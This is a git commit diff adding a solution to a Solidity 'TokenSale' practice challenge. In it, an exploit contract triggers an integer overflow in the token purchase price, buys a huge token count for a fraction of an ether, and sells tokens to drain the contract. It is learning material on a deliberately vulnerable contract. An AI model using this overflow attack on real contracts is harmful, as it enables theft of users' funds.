152f3f6dc5584cfba2b20bf63364758d6656dc80
Surbhi Audichya <audichyasurbhi@gmail.com>
2024-04-11 21:09:17 +0530

    feat: Add exploit solution for solidity TokenSale challenge

--- TokenSale/src/TokenSale.sol
+++ TokenSale/src/TokenSale.sol
@@ -1,6 +1,8 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
+import "forge-std/console.sol";
+
 contract TokenSale {
     mapping(address => uint256) public balanceOf;
     uint256 constant PRICE_PER_TOKEN = 1 ether;
@@ -19,28 +21,51 @@ contract TokenSale {
             total += numTokens * PRICE_PER_TOKEN;
         }
         require(msg.value == total);
-
         balanceOf[msg.sender] += numTokens;
         return (total);
     }
 
     function sell(uint256 numTokens) public {
         require(balanceOf[msg.sender] >= numTokens);
-
         balanceOf[msg.sender] -= numTokens;
-        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
+        (bool ok,) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
         require(ok, "Transfer to msg.sender failed");
     }
 }
 
-// Write your exploit contract below
+/// We need to determine the number of tokens to buy in order to cause overflow in buy function.
+/// The maximum value a uint256 can hold is 2^256 - 1.
+/// We want to find the maximum value of numTokens such that when multiplied by the price per token (1 ether), the result does not exceed the maximum value a uint256 can hold.
+/// If we divide the maximum value a uint256 can hold by the price per token (1 ether), we get the maximum number of tokens that can be bought without causing an overflow.
+/// This is because multiplying this maximum number of tokens by the price per token (1 ether) should still give a value less than or equal to the maximum value a uint256 can hold.
+/// So, by dividing 2^256 - 1 by 1 ether, we get the maximum number of tokens that can be bought without causing an overflow.
+/// Adding 1 to this value ensures that an overflow will occur when calculating the total, allowing the attacker to exploit the contract.
+
 contract ExploitContract {
     TokenSale public tokenSale;
+    bool flag;
 
     constructor(TokenSale _tokenSale) {
         tokenSale = _tokenSale;
     }
 
     receive() external payable {}
-    // write your exploit functions below
+
+    function exploit() external {
+        uint256 PRICE_PER_TOKEN = 1 ether;
+        uint256 numTokens;
+        uint256 ethToSend;
+        uint256 maxNumTokens;
+        // the maximum value of numTokens that, when multiplied by the price per token, does not cause an overflow.
+        maxNumTokens = type(uint256).max / PRICE_PER_TOKEN;
+        // Adding 1 to this value ensures that an overflow will occur when calculating the total, allowing the attacker to exploit the contract.
+        numTokens = maxNumTokens + 1;
+        console.log(numTokens); // 115792089237316195423570985008687907853269984665640564039458
+        unchecked {
+            ethToSend = numTokens * PRICE_PER_TOKEN; //0.415992086870360064
+        }
+        tokenSale.buy{value: ethToSend}(numTokens);
+        tokenSale.sell(1);
+        console.log(address(this).balance);
+    }
 }
--- TokenSale/test/TokenSale.t.sol
+++ TokenSale/test/TokenSale.t.sol
@@ -3,6 +3,7 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import "../src/TokenSale.sol";
+import "forge-std/console.sol";
 
 contract TokenSaleTest is Test {
     TokenSale public tokenSale;
@@ -16,9 +17,18 @@ contract TokenSaleTest is Test {
     }
 
     // Use the instance of tokenSale and exploitContract
+    /*
+    * Determine the number of tokens to buy in order to cause overflow. 
+    * We have to get the maximum possible uint256 = 2**256 - 1, then divide it by 1 ether = 10**18.
+    * This step is needed because the require verification in the sell function multiplies the numTokens by 10**18.
+    * Then, we add 1 to the maxUint256, to ensure that when multiplied by 1 ether, it causes an overflow.
+    * Knowing that the overflow will happen, we need to know by how much in order to send the correct msg.value.
+    * We have established that: ((2**256/10**18) + 1) * 10**18 = overflow. So, the difference overflow - (maxUint256 + 1) = msg.value needed.
+    */
     function testIncrement() public {
         // Put your solution here
 
+        exploitContract.exploit();
         _checkSolved();
     }
 
